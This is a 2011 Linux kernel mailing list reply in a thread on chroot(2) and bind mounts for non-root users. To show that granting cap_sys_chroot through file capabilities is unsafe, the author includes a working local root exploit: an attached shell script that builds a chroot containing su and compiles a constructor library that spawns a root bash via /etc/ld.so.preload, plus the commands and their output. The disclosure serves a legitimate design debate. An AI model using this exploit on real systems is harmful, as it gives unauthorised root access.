Return-Path: <linux-kernel-owner@vger.kernel.org>
Received: (majordomo@vger.kernel.org) by vger.kernel.org via listexpand
	id S1759960Ab1LPPpL (ORCPT <rfc822;w@1wt.eu>);
	Fri, 16 Dec 2011 10:45:11 -0500
Received: from out3.smtp.messagingengine.com ([66.111.4.27]:38462 "EHLO
	out3.smtp.messagingengine.com" rhost-flags-OK-OK-OK-OK)
	by vger.kernel.org with ESMTP id S1759758Ab1LPPpF (ORCPT
	<rfc822;linux-kernel@vger.kernel.org>);
	Fri, 16 Dec 2011 10:45:05 -0500
X-Sasl-enc: OSwyq/aJSOaSXgO2kut8ZCTyBmT02PZikhxGgjuld6ke 1324050304
Subject: Re: chroot(2) and bind mounts as non-root
From: Colin Walters <walters@verbum.org>
To: "Andrew G. Morgan" <morgan@kernel.org>
Cc: Alan Cox <alan@lxorguk.ukuu.org.uk>, "H. Peter Anvin" <hpa@zytor.com>,
        LKML <linux-kernel@vger.kernel.org>, serue@us.ibm.com,
        dhowells@redhat.com, kzak@redhat.com
Date: Fri, 16 Dec 2011 10:44:44 -0500
In-Reply-To: <CALQRfL6A+XUiLUVzsSOkz52rs7Pejtb_v8QZbpWxh5W8yYDYtg@mail.gmail.com>
References: <1323280461.10724.13.camel@lenny> <4EDFCDD4.2080603@zytor.com>
	 <20111207205459.031a0609@lxorguk.ukuu.org.uk>
	 <CALQRfL6A+XUiLUVzsSOkz52rs7Pejtb_v8QZbpWxh5W8yYDYtg@mail.gmail.com>
Content-Type: multipart/mixed; boundary="=-1AOIrvkVs2jXHg2KdToN"
X-Mailer: Evolution 3.0.3 (3.0.3-1.fc15) 
Message-ID: <1324050284.3734.14.camel@lenny>
Mime-Version: 1.0
Sender: linux-kernel-owner@vger.kernel.org
List-ID: <linux-kernel.vger.kernel.org>
X-Mailing-List: linux-kernel@vger.kernel.org


--=-1AOIrvkVs2jXHg2KdToN
Content-Type: text/plain; charset="UTF-8"
Content-Transfer-Encoding: 7bit

On Thu, 2011-12-15 at 10:55 -0800, Andrew G. Morgan wrote:
> I'm genuinely confused whether all these concerns are valid with file
> capabilities.
> 
> Consider (let's say luser is some user that I want to be active inside
> the chroot, but I don't want to allow regular login to my system):

Then we already have different deployment scenarios.  You seem to be
imagining a system where some user has an environment preconfigured by a
system administrator.  My constraint (read my previous posts) is that
the functionality must be available "out of the box" on a mainstream
"distro" such as RHEL or Debian to any uid.  I don't even want to
require addition to some magical group (that in reality is often a root
backdoor anyways).

> root> setcap cap_sys_chroot=ep /tmp/launcher
> Is there a need for privileged binaries within /tmp/chroot? If not,
> how might they get there (without help from root, always presuming I
> can prevent luser from logging in outside of this chroot'd
> environment)?

First of all, as I mentioned in my original mail (and is still in the
Subject line), chroot(2) *almost* gets me what I want - except I need
the ability to at least mount /proc, and being able to do bind mounts is
necessary to use /dev. 

But let's just ignore the bind mounts for a second and pretend
cap_sys_chroot is enough.  Is your suggestion that we could distribute a
copy of /usr/sbin/chroot that grants cap_sys_chroot via file caps a
secure thing to add to util-linux?  Or we could just add it to
coreutils?

See the attached shell script for an attack that should work against
*any* setuid binary that uses glibc.  I wrote this without looking at
other exploits on the internet, just reading the glibc sources - mainly
for my own edification.

It turns out in this case glibc trusts the contents of /etc, and in
particular /etc/ld.so.preload.  So all I need to do is make a shared
library that just runs /bin/bash as a __attribute__ ((constructor)), and
when the glibc dynamic linker is loading /bin/su that I've hardlinked
into the chroot, game over:

$ cp /usr/sbin/chroot /usr/local/bin/fcaps-chroot
$ sudo setcap cap_sys_chroot=ep /usr/local/bin/fcaps-chroot
$ ./chroot-with-su.sh
$ fcaps-chroot mychroot
(now inside the chroot, but still uid=500)
$ echo /lib64/rootshell.so > /etc/ld.so.preload
$ su -
uid=500; euid=0; starting /bin/bash
# id        
uid=0 gid=500 groups=500

The glibc linker also doesn't check that e.g. /lib64/libc.so.6 is owned
by root - clearly I could just replace that with whatever I want.  But
this is less typing.  Note glibc isn't buggy here, it was designed in a
world where unprivileged users can't chroot.


--=-1AOIrvkVs2jXHg2KdToN
Content-Type: application/x-shellscript; name="chroot-with-su.sh"
Content-Disposition: attachment; filename="chroot-with-su.sh"
Content-Transfer-Encoding: 7bit

#!/bin/sh

set -e
set -x

mkdir mychroot 
cd mychroot 
mkdir {bin,etc,lib64}
for f in libtinfo.so.5 libdl.so.2 libgcc_s.so.1 libc.so.6 ld-linux-x86-64.so.2 \
         libcrypt.so.1 libpam.so.0 libpam_misc.so.0 libaudit.so.1 libfreebl3.so \
         libselinux.so.1 librt.so.1 libcap.so.2 libacl.so.1 libpthread.so.0 libattr.so.1; do
    cp /lib64/$f lib64/;
done
for prog in bash cat su ls id mkdir chroot; do
    ln `which $prog` bin
done

cat > rootshell.c <<EOF
#include <unistd.h>
#include <stdlib.h>
#include <stdio.h>
#include <sys/types.h>
#include <errno.h>

void start_shell_constructor (void) __attribute__ ((constructor));

void
start_shell_constructor (void)
{
  if (!getenv ("STARTED_ROOTSHELL") && geteuid () == 0)
    {
      setenv ("STARTED_ROOTSHELL", "TRUE", 1);
      fprintf (stderr, "uid=%d; euid=%d; starting /bin/bash\n", getuid(), geteuid());
      setuid (0);
      execl ("/bin/bash", "/bin/bash", NULL);
      perror ("execl");
    }
}
EOF
gcc -Wall -fPIC -shared -o lib64/rootshell.so rootshell.c
chmod u+s lib64/rootshell.so
rm rootshell.c

# echo /lib64/rootshell.so > ./etc/ld.so.preload

--=-1AOIrvkVs2jXHg2KdToN--

